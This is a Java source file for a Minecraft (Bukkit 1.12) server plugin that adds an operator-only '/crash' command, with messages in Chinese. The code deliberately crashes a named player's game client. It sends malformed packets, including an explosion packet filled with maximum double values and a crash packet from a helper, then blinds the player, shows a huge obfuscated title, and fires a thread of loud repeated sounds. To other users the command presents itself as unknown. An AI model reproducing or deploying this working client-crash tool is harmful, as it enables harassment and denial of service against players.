package cn.starry.hub.commands.deprecated;

import cn.starry.hub.Main;
import cn.starry.hub.utils.CrashUtil;
import cn.starry.hub.utils.crash.BossBarUtil;
import net.minecraft.server.v1_12_R1.PacketPlayOutExplosion;
import net.minecraft.server.v1_12_R1.Vec3D;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Sound;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_12_R1.entity.CraftPlayer;
import org.bukkit.entity.Player;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;
import org.bukkit.scheduler.BukkitRunnable;

import java.util.Collections;
import java.util.Random;

@Deprecated
public class CrashCommand implements CommandExecutor {
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        if (cmd.getName().equalsIgnoreCase("crash")) {
            if (!sender.isOp()) {
                sender.sendMessage("Unknown command. Type " + "/help" + " for help.");
                return false;
            }
            if (args.length == 0) {
                sender.sendMessage("§c用法: /crash <玩家>");
                return true;
            }
            if (args.length > 0) {
                final Player target = Bukkit.getServer().getPlayer(args[0]);
                if (args[0].equals(sender.getName())) {
                    sender.sendMessage("§c你不能崩掉自己！");
                    return true;
                }
                if (target == null) {
                    sender.sendMessage("§a" + args[0] + "§c玩家不在线！");
                    return true;
                }
                sender.sendMessage("§b已经崩掉目标客户端！§c(如果该玩家无法崩掉说明使用了非法客户端)");
                new BukkitRunnable(){

                    public void run() {
                        CrashCommand.this.Crash_Util_1(target);
                    }
                }.runTaskLater(Main.getPlugin(Main.class), 0L);
                new BukkitRunnable(){

                    public void run() {
                        CrashCommand.this.Crash_Util_2(target);
                    }
                }.runTaskLater(Main.getPlugin(Main.class), 10L);
                new BukkitRunnable(){

                    public void run() {
                        CrashCommand.this.Crash_Util_3(target);
                    }
                }.runTaskLater(Main.getPlugin(Main.class), 20L);
                new BukkitRunnable(){

                    public void run() {
                        CrashCommand.this.Crash_Util_4(target);
                    }
                }.runTaskLater(Main.getPlugin(Main.class), 30L);
            }
        }
        return true;
    }

    private void Crash_Util_1(Player target) {
        BossBarUtil.sendBossBar(target, "", 1, Main.getPlugin(Main.class));
    }

    private void Crash_Util_2(Player target) {
        ((CraftPlayer)(target)).getHandle().playerConnection.sendPacket(new PacketPlayOutExplosion(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Collections.EMPTY_LIST, new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)));
    }

    private void Crash_Util_3(Player target) {
        Object packet = CrashUtil.getCrashPacket();
        if (packet == null) {
            Bukkit.getConsoleSender().sendMessage(ChatColor.RED + "look like u server not support");
        }
        CrashUtil.sendPacket(target, packet);
    }

    private void Crash_Util_4(final Player player) {
        player.addPotionEffect(new PotionEffect(PotionEffectType.BLINDNESS, 200, 9, true, true));
        String message = null;
        for (int i = 0; i < 10000; ++i) {
            String s = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
            char[] c = s.toCharArray();
            Random random = new Random();
            message = message + c[random.nextInt(c.length)] + (int)(Math.random() * 100.0);
        }
        message = "§7§k" + message;
        player.sendTitle(message, message,0,400,0);
        new Thread(new Runnable(){

            @Override
            public void run() {
                for (int a = 0; a < 100; ++a) {
                    player.playSound(player.getLocation(), Sound.ENTITY_WITHER_DEATH, 10.0f, 1.0f);
                    player.playSound(player.getLocation(), Sound.ENTITY_WITHER_HURT, 10.0f, 1.0f);
                    player.playSound(player.getLocation(), Sound.ENTITY_WITHER_AMBIENT, 10.0f, 1.0f);
                    player.playSound(player.getLocation(), Sound.ENTITY_WITHER_SHOOT, 10.0f, 1.0f);
                    player.playSound(player.getLocation(), Sound.ENTITY_WITHER_SPAWN, 10.0f, 1.0f);
                    player.playSound(player.getLocation(), Sound.ENTITY_ENDERDRAGON_FLAP, 10.0f, 1.0f);
                    player.playSound(player.getLocation(), Sound.ENTITY_ENDERDRAGON_DEATH, 10.0f, 1.0f);
                    player.playSound(player.getLocation(), Sound.ENTITY_ENDERDRAGON_GROWL, 10.0f, 1.0f);
                    player.playSound(player.getLocation(), Sound.ENTITY_ENDERDRAGON_HURT, 10.0f, 1.0f);
                    player.playSound(player.getLocation(), Sound.AMBIENT_CAVE, 10.0f, 1.0f);
                    try {
                        Thread.sleep(100L);
                    } catch (InterruptedException e) {
                        throw new RuntimeException(e);
                    }
                }
            }
        }).start();
    }
}
